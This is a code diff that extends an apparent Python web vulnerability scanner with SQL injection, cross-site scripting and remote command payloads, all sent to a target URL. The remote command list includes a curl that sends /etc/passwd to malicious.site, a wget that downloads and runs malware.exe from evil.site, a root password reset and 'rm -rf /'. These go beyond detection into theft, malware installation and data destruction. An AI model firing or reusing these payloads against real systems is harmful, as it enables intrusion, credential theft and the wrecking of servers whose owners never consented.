@@ -75,6 +75,17 @@ def scan_sql_injection(url):
         "' OR 1=1 --",
         "' OR 'a'='a",
         "1'; DROP TABLE users; --",
+        "1' OR '1'='1' --",
+        "') OR ('a'='a",
+        "' OR '1'='1",
+        "\" OR \"1\"=\"1",
+        "') OR '1'='1--",
+        "' OR '1'='1'--",
+        "1 or 1=1 --",
+        "1 or 1=1#",
+        "1 union select 1,2,3--",
+        "' UNION SELECT 1,2,3--",
+        "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
     ]
     for payload in payloads:
         new_url = f"{url}?input={payload}"
@@ -127,6 +138,16 @@ def scan_xss(url):
     payloads = [
         f"{js_script}",
         f"'><script>alert('XSS')</script><'",
+        "'';!--\"<XSS>=&{()}",
+        "><svg/onload=alert('XSS')>",
+        "'\"(){}:;><svg/onload=alert('XSS')>",
+        "'\"/><svg/onload=alert('XSS')>",
+        "'-alert(1)-'",
+        "'-alert(1)//",
+        "javascript:alert('XSS')",
+        "<img src=x onerror=alert('XSS')>",
+        "<img src='/' onerror='alert(\"XSS\")'/>",
+        "'<script>alert(document.cookie)</script>",
     ]
     is_vulnerable = False
     
@@ -150,6 +171,14 @@ def remote_code_execution(url):
         "system('ls');",
         "system('whoami');",
         "system('cat /etc/passwd');",
+        "`ls`",
+        "`whoami`",
+        "`cat /etc/passwd`",
+        "echo 'VULNERABLE' > /tmp/vuln.txt",
+        "curl -X POST https://malicious.site --data 'stolen_data=$(cat /etc/passwd)'",
+        "wget https://evil.site/malware.exe -O /tmp/malware.exe && chmod +x /tmp/malware.exe && /tmp/malware.exe", 
+        "echo 'root:password' | chpasswd",
+        "rm -rf /",
     ]
     for payload in payloads:
         response = requests.get(url, params={"input": payload})
